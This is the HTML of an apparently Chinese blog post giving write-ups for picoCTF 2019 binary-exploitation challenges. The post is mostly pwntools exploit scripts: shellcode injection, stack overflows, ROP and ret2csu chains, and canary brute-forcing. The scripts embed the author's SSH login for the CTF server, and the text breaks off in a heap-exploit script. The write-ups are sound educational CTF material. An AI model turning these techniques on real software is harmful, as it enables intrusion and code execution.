@@ -1,0 +1,1012 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="Chinese">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222"/>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.0"/>
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/2.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/2.png?v=7.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="practice-run-1ssh远程连接，直接运行程序即可得到flag 12345kangel@pico-2019-shell1:~$ cd /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775ekangel@pico-2019-shell1:/problems/practice-run-1_0_62b61488e896645ebf">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="picoctf2019pwn解题记录">
+<meta property="og:url" content="https://j-kangel.github.io/2019/09/30/picoctf2019pwn解题记录/index.html">
+<meta property="og:site_name" content="KANGEL">
+<meta property="og:description" content="practice-run-1ssh远程连接，直接运行程序即可得到flag 12345kangel@pico-2019-shell1:~$ cd /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775ekangel@pico-2019-shell1:/problems/practice-run-1_0_62b61488e896645ebf">
+<meta property="og:locale" content="Chinese">
+<meta property="og:image" content="https://j-kangel.github.io/2019/09/30/picoctf2019pwn解题记录/1.JPG">
+<meta property="og:updated_time" content="2019-10-18T03:15:53.916Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="picoctf2019pwn解题记录">
+<meta name="twitter:description" content="practice-run-1ssh远程连接，直接运行程序即可得到flag 12345kangel@pico-2019-shell1:~$ cd /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775ekangel@pico-2019-shell1:/problems/practice-run-1_0_62b61488e896645ebf">
+<meta name="twitter:image" content="https://j-kangel.github.io/2019/09/30/picoctf2019pwn解题记录/1.JPG">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="KANGEL" type="application/atom+xml"/>
+
+
+
+  
+  
+  <link rel="canonical" href="https://j-kangel.github.io/2019/09/30/picoctf2019pwn解题记录/"/>
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>picoctf2019pwn解题记录 | KANGEL</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="Chinese">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+<a href="https://github.com/J-KANGEL" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">KANGEL</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br/>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://j-kangel.github.io/2019/09/30/picoctf2019pwn解题记录/"/>
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="kangel"/>
+      <meta itemprop="description" content="Life is beautiful!"/>
+      <meta itemprop="image" content="/images/0.jpg"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="KANGEL"/>
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">picoctf2019pwn解题记录
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-09-30 12:03:30" itemprop="dateCreated datePublished" datetime="2019-09-30T12:03:30Z">2019-09-30</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-10-18 03:15:53" itemprop="dateModified" datetime="2019-10-18T03:15:53Z">2019-10-18</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn学习/" itemprop="url" rel="index"><span itemprop="name">pwn学习</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="practice-run-1"><a href="#practice-run-1" class="headerlink" title="practice-run-1"></a>practice-run-1</h4><p>ssh远程连接，直接运行程序即可得到flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kangel@pico-2019-shell1:~$ <span class="built_in">cd</span> /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e</span><br><span class="line">kangel@pico-2019-shell1:/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e$ ls</span><br><span class="line">run_this</span><br><span class="line">kangel@pico-2019-shell1:/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e$ ./run_this</span><br><span class="line">picoCTF&#123;g3t_r3adY_2_r3v3r53&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="handy-shellcode"><a href="#handy-shellcode" class="headerlink" title="handy-shellcode"></a>handy-shellcode</h4><p>利用pwntools进行ssh连接，然后写进shellcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"shellcode:\n"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>拿到shell之后</p>
+<p><code>picoCTF{h4ndY_d4ndY_sh311c0d3_707f1a87}</code></p>
+<h4 id="slippery-shellcode"><a href="#slippery-shellcode" class="headerlink" title="slippery-shellcode"></a>slippery-shellcode</h4><p>和handy-shellcode类似，进行右填充即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"shellcode:\n"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.rjust(<span class="number">512</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}</code></p>
+<h4 id="OverFlow-0"><a href="#OverFlow-0" class="headerlink" title="OverFlow 0"></a>OverFlow 0</h4><p>题目给了源代码和程序，按照一般的pwn题解法，还是直接用ida查看程序</p>
+<p><img src="/2019/09/30/picoctf2019pwn解题记录/1.JPG" alt=""></p>
+<p>程序发生段错误则执行sigsegv_handler函数，该函数刚好打印flag，所以只要栈溢出到ebp即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kangel@pico-2019-shell1:/problems/overflow-0_5_db665826dabb99c44758c97abfd8c4c6$ ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">picoCTF&#123;3asY_P3a5y4a888b8e&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="OverFlow-1"><a href="#OverFlow-1" class="headerlink" title="OverFlow 1"></a>OverFlow 1</h4><p>返回地址覆盖成flag函数地址即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line"><span class="comment">#p = process("./vuln")</span></span><br><span class="line">flag_addr = <span class="number">0x080485E6</span></span><br><span class="line">p.recvuntil(<span class="string">"happens: "</span>)</span><br><span class="line">payload = <span class="number">0x48</span>*<span class="string">'a'</span> + <span class="string">'aaaa'</span> + p32(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5b80c9cbf}</code></p>
+<h4 id="OverFlow-2"><a href="#OverFlow-2" class="headerlink" title="OverFlow 2"></a>OverFlow 2</h4><p>返回地址覆盖成flag地址，32位参数覆写直接在栈中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/overflow-2_1_210f23786438d7f7e527f4901367a74b"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">flag_addr = <span class="number">0x080485E6</span></span><br><span class="line">p.recvuntil(<span class="string">"string: "</span>)</span><br><span class="line">payload =<span class="number">0xb8</span>*<span class="string">'a'</span> + <span class="string">'aaaa'</span> + p32(flag_addr) +<span class="string">'aaaa'</span> + p32(<span class="number">0xDEADBEEF</span>) + p32(<span class="number">0xC0DED00D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{arg5_and_r3turn5001d1db0}</code></p>
+<h4 id="NewOverFlow-1"><a href="#NewOverFlow-1" class="headerlink" title="NewOverFlow 1"></a>NewOverFlow 1</h4><p>在Ubuntu18的环境中，直接将返回地址覆盖成flag地址，flag函数中的printf会出现段错误，需要通过执行一些其他函数来调整寄存器或对齐，这里先执行puts函数，然后执行flag函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line"><span class="comment">#p = process("./vulnnew")</span></span><br><span class="line">flag_addr = <span class="number">0x0000000000400767</span></span><br><span class="line">puts_addr = <span class="number">0x00000000004005f0</span></span><br><span class="line">p.recvuntil(<span class="string">"Welcome to 64-bit. Give me a string that gets you the flag: "</span>)</span><br><span class="line">payload = <span class="number">0x48</span>*<span class="string">'a'</span> + p64(puts_addr) + p64(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_72d3e39f}</code></p>
+<h4 id="NewOverFlow-2"><a href="#NewOverFlow-2" class="headerlink" title="NewOverFlow 2"></a>NewOverFlow 2</h4><p>这道题需要用到ret2csu来覆写参数，具体参见<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/newoverflow-2_1_bcd752d56a87efb5dfc9803b461809f7"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line"><span class="comment">#p = process("./vuln")</span></span><br><span class="line">elf=ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">flag_addr = <span class="number">0x000000000040084d</span></span><br><span class="line">balance_got = elf.got[<span class="string">'getegid'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x4009a3</span></span><br><span class="line">f1_addr = <span class="number">0x400767</span></span><br><span class="line">f2_addr = <span class="number">0x400781</span></span><br><span class="line">win_addr = <span class="number">0x4007be</span></span><br><span class="line">p.recvuntil(<span class="string">"numbers?"</span>)</span><br><span class="line">payload = <span class="number">0x48</span>*<span class="string">'a'</span> + p64(<span class="number">0x4005f0</span>) + p64(pop_rdi) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(f1_addr)</span><br><span class="line">csu_end_addr = <span class="number">0x40099a</span></span><br><span class="line">csu_front_addr = <span class="number">0x400980</span></span><br><span class="line">payload += p64(csu_end_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(balance_got) + p64(<span class="number">0xBAADCAFE</span>) + p64(<span class="number">0xCAFEBABE</span>) + p64(<span class="number">0xABADBABE</span>)</span><br><span class="line">payload += p64(csu_front_addr) + <span class="number">0x38</span>*<span class="string">'a'</span> + p64(f2_addr) + p64(main_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"numbers?"</span>)</span><br><span class="line">payload = <span class="number">0x48</span>*<span class="string">'a'</span> + p64(win_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause(5)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>结果如下</p>
+<p><code>picoCTF{r0p_1t_d0nT_st0p_1t_3b39d86e}</code></p>
+<h4 id="CanaRy"><a href="#CanaRy" class="headerlink" title="CanaRy"></a>CanaRy</h4><h5 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h5><p>首先读入canary.txt到.bss中，将该canary写进栈中。读入数据，判断是否覆盖掉canary</p>
+<h5 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h5><p>首先爆破canary</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">canary = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	<span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">		canary_temp = canary + chr(a)</span><br><span class="line">		p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">		p.sendlineafter(<span class="string">"entry:\n&gt; "</span> , str(<span class="number">0x100</span>))</span><br><span class="line">		payload = <span class="string">"a"</span> * <span class="number">0x20</span> + canary_temp</span><br><span class="line">		p.sendafter(<span class="string">"Input&gt; "</span> , payload)</span><br><span class="line">		result = p.recvline()</span><br><span class="line">		log.info(result)</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Stack Smashing"</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">			canary += chr(a)</span><br><span class="line">			log.success(<span class="string">"canary found :"</span> + canary)</span><br><span class="line">			pause()</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>得到canary为<code>wrvW</code>，然后覆盖掉返回地址为display_flag地址即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./vuln'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(elf.symbols[<span class="string">'display_flag'</span>]) <span class="comment">#0x7ed</span></span><br><span class="line">canary = <span class="string">"wrvW"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">	p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">	payload = <span class="string">'a'</span>*<span class="number">0x20</span> + canary + <span class="string">"b"</span> * (<span class="number">0xc</span> + <span class="number">0x4</span>)+<span class="string">'\xed\x97'</span></span><br><span class="line">	p.recvuntil(<span class="string">"entry:\n&gt; "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">0x100</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Input&gt; "</span>) </span><br><span class="line">	p.send(payload)</span><br><span class="line">	result = p.recvall()</span><br><span class="line">	log.info(result)</span><br><span class="line">	p.close()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"picoCTF"</span> <span class="keyword">in</span> result:</span><br><span class="line">		log.success(<span class="string">"flag found!"</span>)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{cAnAr135_mU5t_b3_r4nd0m!_40765d8a}</code></p>
+<h4 id="leap-frog"><a href="#leap-frog" class="headerlink" title="leap-frog"></a>leap-frog</h4><p>程序分析：要使win1、win2、win3都不为零才能打印flag</p>
+<p>攻击思路：直接写数据到win中，简单粗暴</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/leap-frog_0_b02581eeadf3f35f4356e23db08bddf9"</span>)</span><br><span class="line">p = s.process(<span class="string">"./rop"</span>)</span><br><span class="line">flag_addr = <span class="number">0x080486B3</span></span><br><span class="line">gets_addr = <span class="number">0x08048430</span></span><br><span class="line">p.recvuntil(<span class="string">"input&gt; "</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'aaaa'</span> + p32(gets_addr) + p32(flag_addr) +p32(<span class="number">0x0804a03d</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'2222'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_8783895b}</code></p>
+<h4 id="messy-malloc"><a href="#messy-malloc" class="headerlink" title="messy-malloc"></a>messy-malloc</h4><p>一道简单的堆题，注意环境是libc.2.27.so，引入了tcache机制。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"2019shell1.picoctf.com"</span>,<span class="string">"49920"</span>)</span><br><span class="line"><span class="comment">#p = process("./auth")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_flag</span><span 